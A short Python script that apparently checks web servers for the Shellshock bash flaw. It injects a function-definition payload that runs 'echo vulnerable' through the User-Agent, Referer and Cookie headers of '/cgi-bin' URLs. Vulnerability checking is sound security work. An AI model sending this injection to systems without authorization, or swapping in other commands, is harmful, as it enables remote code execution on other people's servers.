#!/usr/bin/env python

import sys
import requests
from colorama import Fore, Style

class VulnCheck:
    
    def urlcheck(url):
        
        if '/cgi-bin' in url:
            
            shock = '() { :;}: echo; echo vulnerable'
            headers = {'User-Agent':shock, 'Referer':shock, 'Cookie':shock}
            
            try:
                r = requests.get(url, headers=headers, timeout=10)
            except requests.ConnectionError as err:
                print(Fore.RED + '[!] Error: The connection failed!' + Style.RESET_ALL)
                sys.exit()
                
            if 'vulnerable' in r.text:
                print(Fore.GREEN + '[+] This site is vulnerable to shellshock!' + Style.RESET_ALL)
            else:
                print(Fore.RED + '[-] This site is not vulnerable to shellshock' + Style.RESET_ALL)
            
                